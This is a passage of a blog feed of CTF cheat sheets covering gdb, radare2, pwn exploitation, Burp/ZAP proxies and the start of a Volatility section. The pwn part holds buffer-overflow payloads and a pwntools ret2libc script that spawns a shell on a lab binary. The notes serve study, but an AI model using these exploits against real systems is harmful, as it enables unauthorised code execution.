&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; define hook-stop &lt;span class=&quot;c&quot;&gt;# with hook-stop&lt;/span&gt;
    Type commands &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;definition of &lt;span class=&quot;s2&quot;&gt;&quot;hook-stop&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
    End with a line saying just &lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;p/c &lt;span class=&quot;nv&quot;&gt;$al&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$al&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;end

&lt;span class=&quot;c&quot;&gt;# executed at each breakpoint&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;1 2 3 4
    Type commands &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;breakpoint&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1 2 3 4, one per line.
    End with a line saying just &lt;span class=&quot;s2&quot;&gt;&quot;end&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;p/c &lt;span class=&quot;nv&quot;&gt;$al&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$al&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;show-variable&quot;&gt;show variable&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; x/[nb-bloc][format][bloc-size] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;address]

&lt;span class=&quot;c&quot;&gt;# [nb-bloc] : nombre de blocs à afficher&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [format] : format d’affichage, s (string)/i (instruction machine)/x (hexadecimal)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [bloc-size] : taille des blocs b(1byte)/h(2bytes)/w(4bytes)/g(8bytes)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [address] : à partir d’où afficher la mémoire.&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/d i &lt;span class=&quot;c&quot;&gt;# afficher mode signé&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/u i &lt;span class=&quot;c&quot;&gt;# afficher mode non signé&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/f i &lt;span class=&quot;c&quot;&gt;# mode flottant&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/c i &lt;span class=&quot;c&quot;&gt;# mode caractère&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/t i &lt;span class=&quot;c&quot;&gt;# mode binaire&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/o i &lt;span class=&quot;c&quot;&gt;# mode octale&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/x i &lt;span class=&quot;c&quot;&gt;# mode hexa&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p/a i &lt;span class=&quot;c&quot;&gt;# mode adresse&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;radare2&quot;&gt;radare2&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; ./file.bin
&lt;span class=&quot;c&quot;&gt;# -d: debug&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -w: allow writing&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -A: aaaa at start&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# print functions&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; afl

&lt;span class=&quot;c&quot;&gt;# jump to main function&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; s main

&lt;span class=&quot;c&quot;&gt;# print current function&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pdf

&lt;span class=&quot;c&quot;&gt;# set breakpoint&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; db 0x87654321

&lt;span class=&quot;c&quot;&gt;# continu (next breakpoint)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dc

&lt;span class=&quot;c&quot;&gt;# next line&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ds

&lt;span class=&quot;c&quot;&gt;# info registers&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dr

&lt;span class=&quot;c&quot;&gt;# edit register&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dr &lt;span class=&quot;nv&quot;&gt;eip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x08048709

&lt;span class=&quot;c&quot;&gt;# new execution&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ood arg1 arg2

&lt;span class=&quot;c&quot;&gt;# local varibale values&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; afvd

&lt;span class=&quot;c&quot;&gt;# show stack&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pxr @ esp

&lt;span class=&quot;c&quot;&gt;# edit instruction at 0x080486fc (r2 -w ...)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; s 0x080486fc
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; wa jne 0x80486fe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;pwn&quot;&gt;pwn&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# follow buffer overflow message&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dmesg | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt;
... segfault at 41414141 ... &lt;span class=&quot;c&quot;&gt;# or see -&amp;gt; 'ip' and not 'at'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# address of function&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; vuln.out

&lt;span class=&quot;c&quot;&gt;# pack addresses&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import struct; print(repr(struct.pack('&amp;lt;I', 0x080485cb)))&quot;&lt;/span&gt;
b&lt;span class=&quot;s1&quot;&gt;'\xcb\x85\x04\x08'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# payload example&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import struct; print('A'*44 + struct.pack('&amp;lt;I', 0x080485cb))&quot;&lt;/span&gt; | ./vuln

&lt;span class=&quot;c&quot;&gt;# shellcode on shell-storm.org/shellcode&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('shell code')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./vuln

&lt;span class=&quot;c&quot;&gt;# LD_PRELOAD to replace function&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;python&quot;&gt;python&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# to fill char buf[40];
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadc00f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# &amp;lt;: little indian
# I; unsigned int
# Oxdeadbeef: change the value of 'check' to 0xdeadbeef
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print final payload in bytes
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# (python3 /tmp/get_flag.py; cat) | ./ch13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# example
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x080485cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# same that pack
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# push args then function
# ebp + 0x4 -&amp;gt; return address
# ebp + 0x8 -&amp;gt; arg 1
# ebp + 0xc -&amp;gt; arg 2
&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EIP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`python -c &quot;print('A'*100)&quot;`&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ret2libc
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdb_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7e51ca0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gdb_system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7e2cda0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb_puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb_system&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./vuln'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;prompt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts: (.*)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'useful_string: (.*)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;160&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'RETN'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; import pwn
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; import binascii

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; binascii.hexlify&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pwn.asm&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'xor eax, eax'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
b&lt;span class=&quot;s1&quot;&gt;'31c0'&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; binascii.hexlify&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pwn.asm&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'nop'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
b&lt;span class=&quot;s1&quot;&gt;'90'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;protections&quot;&gt;protections&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;// TODO&lt;/p&gt;

&lt;h4 id=&quot;sources&quot;&gt;sources&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=PorfLSr3DDI&quot;&gt;vidéo&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=-n9Fkq1e6sg&quot;&gt;vidéo&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=Ve9eDc3N-pQ&quot;&gt;vidéo&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;https://www.dailysecurity.fr/&lt;/li&gt;
  &lt;li&gt;https://www.dailysecurity.fr/la-stack-smashing-protection/&lt;/li&gt;
  &lt;li&gt;https://www.segmentationfault.fr/linux/role-plt-got-ld-so/&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pratique&quot;&gt;pratique&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/Caesurus/how2bof&quot;&gt;how2bof&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>web</title>
   <link href="http://localhost:4000/ctf/2019/07/26/web/"/>
   <updated>2019-07-26T00:00:00+02:00</updated>
   <id>http://localhost:4000/ctf/2019/07/26/web</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;web&quot;&gt;web&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%0a : saut de ligne
%20 : espace
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tools : onglet de burp&lt;/p&gt;

&lt;p&gt;TARGET : historique de tout ce qui a été visité&lt;/p&gt;

&lt;p&gt;PROXY : utilisation du proxy&lt;/p&gt;

&lt;p&gt;SPIDER : découvre les pages d’un site, en recherchant des liens internes&lt;/p&gt;

&lt;p&gt;SCANNER : cherche vulnérabilitées comme Nikto, Arachni, Nessus, Skipfish&lt;/p&gt;

&lt;p&gt;INTRUDER : fuzzer, brute force de requêtes&lt;/p&gt;

&lt;p&gt;REPEATER : modifier request et voir response&lt;/p&gt;

&lt;p&gt;SEQUENCER : Cet outil permet d’analyser le comportement d’un élément précis dans la réponse du serveur découlant d’une requête particulière en la testant un très grand nombre de fois. Quelques outils statistiques permettent de travailler sur la capture depuis Burp Suite, cependant l’export de ces données permet une étude plus poussée des valeurs ciblées.&lt;/p&gt;

&lt;p&gt;DECODER : encoder, décoder, hacher des chaines de caractères&lt;/p&gt;

&lt;p&gt;COMPARER : comporer 2 élements (2 headers http par exemple)&lt;/p&gt;

&lt;p&gt;OPTIONS : paramètrage&lt;/p&gt;

&lt;p&gt;ALERTS : logs importants&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;web-application-proxies&quot;&gt;web application proxies&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;HTTP proxy is a software that is between the browser and the website (MITM), intercept all traffic that flows between them. Analyse the proxy traffic will let us understand the inner working of the application.&lt;/p&gt;

&lt;h4 id=&quot;burp-proxy&quot;&gt;Burp Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Free version has some limitations on the fuzzing tool (Intruder). It includes a web spider, Intruder, and a Repeater.&lt;/li&gt;
  &lt;li&gt;Nontransparent proxy: we have to configure the browser to use this proxy.&lt;/li&gt;
  &lt;li&gt;By default, intercept only requests from clients. We can intercept responses by changing that in Proxy, Options, Intercept Server responses.&lt;/li&gt;
  &lt;li&gt;We can customize client interception: specific domain, HTTP methods, cookies names,… Once intercepted, we can edit the values, forward them to the server, and analyse the response.&lt;/li&gt;
  &lt;li&gt;Modifying requests on the fly: in Match and Replace section, we can create rules that will look for specific values in the request and edit it on the fly automatically. For example, replace tue User-Agent value with IE, iOS, Android,…&lt;/li&gt;
  &lt;li&gt;Burp Proxy with HTTPS website: Burp has Self-signed certificate to be able to decrypt HTTPS communications. Proxy &amp;gt; Options &amp;gt; Proxy Listeners and export the certificat to browser to be trusted.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;zed-attack-proxy-zap&quot;&gt;Zed Attack Proxy (ZAP)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Maintained by Open Web Application Security Project (OWASP).&lt;/li&gt;
  &lt;li&gt;Not easy as Burp. But includes tools to identify directories and files in a server.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;proxystrike&quot;&gt;ProxyStrike&lt;/h4&gt;

&lt;p&gt;Not only a proxy, il also actively finds vulnerabilities, modules to find SQLi, XSS.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>forensic</title>
   <link href="http://localhost:4000/ctf/2019/07/23/forensic/"/>
   <updated>2019-07-23T00:00:00+02:00</updated>
   <id>http://localhost:4000/ctf/2019/07/23/forensic</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;volatility&quot;&gt;volatility&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# profile&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump imageinfo
Suggested Profile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86

&lt;span class=&quot;c&quot;&gt;# list available profiles&lt;/span&gt;
